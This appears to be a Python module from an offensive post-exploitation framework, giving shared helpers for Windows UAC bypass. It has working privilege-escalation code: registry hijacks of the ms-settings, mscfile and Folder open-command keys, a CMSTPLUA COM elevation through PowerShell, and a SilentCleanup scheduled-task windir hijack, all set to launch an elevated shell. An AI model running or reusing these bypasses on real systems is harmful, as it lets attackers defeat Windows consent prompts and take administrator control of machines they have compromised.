#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared helpers for Windows UAC bypass post modules."""

from __future__ import annotations

import time
from typing import Callable

from core.output_handler import print_debug, print_error, print_status, print_success, print_warning

from lib.post.windows.session import WindowsSessionMixin

REG_MS_SETTINGS = r"HKCU\Software\Classes\ms-settings\Shell\Open\command"
REG_MSCFILE = r"HKCU\Software\Classes\mscfile\shell\open\command"
REG_FOLDER = r"HKCU\Software\Classes\Folder\shell\open\command"
SILENT_CLEANUP_TASK = r"\Microsoft\Windows\DiskCleanup\SilentCleanup"
CMSTPLUA_CLSID = "3E5FC7F9-9A51-4367-9063-A120244FBEC7"

UAC_AGENT = {
    "risk": "intrusive",
    "effects": ["active_exploitation"],
    "expected_requests": 2,
    "reversible": False,
    "approval_required": True,
    "produces": ["risk_signals", "elevated_shell"],
    "cost": 1.5,
    "noise": 0.6,
    "value": 1.2,
    "requires": {
        "min_endpoints": 0,
        "min_params": 0,
        "tech_hints_any": [],
        "tech_hints_all": [],
        "specializations_any": [],
        "risk_signals_any": [],
        "auth_session": False,
        "capabilities_any": ["shell"],
        "capabilities_all": [],
        "confidence_min": {},
        "confidence_min_any": {},
        "endpoint_pattern_any": [],
        "param_any": [],
        "api_surface_ready": False,
    },
    "chain": {
        "produces_capabilities": [{"capability": "shell", "from_detail": "elevated"}],
        "consumes_capabilities": ["shell"],
        "option_bindings": {},
        "suggested_followups": [],
    },
}


class UacBypassMixin(WindowsSessionMixin):
    """UAC-specific helpers built on generic Windows session operations."""

    def uac_execute(self, command: str, timeout: int = 10) -> str:
        return self.win_execute(command, timeout=timeout)

    def uac_require_windows(self) -> bool:
        return self.win_require_windows()

    def uac_is_admin(self) -> bool:
        return self.win_is_admin()

    @staticmethod
    def uac_reg_ok(text: str) -> bool:
        t = (text or "").lower()
        return "successfully" in t or "réussi" in t or "opération réussie" in t

    def uac_write_reg_command(self, reg_key: str, command: str, *, delegate_execute: bool = False) -> bool:
        data = command.replace('"', r"\"")
        r1 = self.uac_execute(f'reg add "{reg_key}" /d "{data}" /f', timeout=5)
        if not self.uac_reg_ok(r1):
            print_debug(r1)
            return False
        if delegate_execute:
            r2 = self.uac_execute(
                f'reg add "{reg_key}" /v "DelegateExecute" /t REG_SZ /d "" /f',
                timeout=5,
            )
            if not self.uac_reg_ok(r2):
                print_debug(r2)
                return False
        return True

    def uac_delete_registry_tree(self, path: str) -> None:
        self.uac_execute(f'reg delete "{path}" /f', timeout=5)

    def uac_run_hijack(
        self,
        *,
        reg_key: str,
        command: str,
        trigger: str,
        cleanup_paths: list[str],
        delegate_execute: bool = False,
        wait: float = 3.0,
    ) -> bool:
        if not self.uac_write_reg_command(reg_key, command, delegate_execute=delegate_execute):
            print_error("Registry hijack failed.")
            return False
        print_status(f"Triggering: {trigger}")
        self.uac_execute(trigger, timeout=5)
        time.sleep(wait)
        for path in cleanup_paths:
            self.uac_delete_registry_tree(path)
        return True

    def uac_default_command(self) -> str:
        opt = getattr(self, "command", None)
        val = opt.value if hasattr(opt, "value") else opt
        return str(val or "").strip()

    def uac_prepare_elevated_command(self) -> str:
        cmd = self.uac_default_command()
        if cmd:
            return cmd
        return "cmd.exe"

    def uac_bypass_cmstplua(self, command: str) -> bool:
        escaped = command.replace('"', '`"')
        ps = (
            f'powershell -Command "$t = [System.Activator]::CreateInstance('
            f'[System.Type]::GetTypeFromCLSID(\'{CMSTPLUA_CLSID}\')); '
            f'$t.ShellExecute(\'{escaped}\',\'\',\'\',\'runas\',0)"'
        )
        self.uac_execute(ps, timeout=10)
        time.sleep(2)
        return True

    def uac_bypass_silentcleanup_windir(self, command: str) -> bool:
        check = self.uac_execute(
            f'schtasks /query /tn "{SILENT_CLEANUP_TASK}" /fo LIST',
            timeout=8,
        )
        if not check or "ERROR" in check.upper() or "not found" in check.lower():
            print_warning("SilentCleanup scheduled task not found.")
            return False
        payload = command.replace('"', '`"')
        ps = (
            f'powershell -Command "$env:windir = \'cmd /c {payload} &\'; '
            f'schtasks /Run /TN \\"{SILENT_CLEANUP_TASK}\\" /I; '
            f'Remove-Item Env:windir -ErrorAction SilentlyContinue"'
        )
        self.uac_execute(ps, timeout=15)
        time.sleep(3)
        return True

    def uac_run_chain(self, steps: list[tuple[str, Callable[[], bool]]]) -> bool:
        for name, func in steps:
            print_status(f"Trying {name}...")
            try:
                if func():
                    print_success(f"{name} succeeded.")
                    return True
                print_warning(f"{name} failed.")
            except Exception as exc:
                print_warning(f"{name} error: {exc}")
        return False
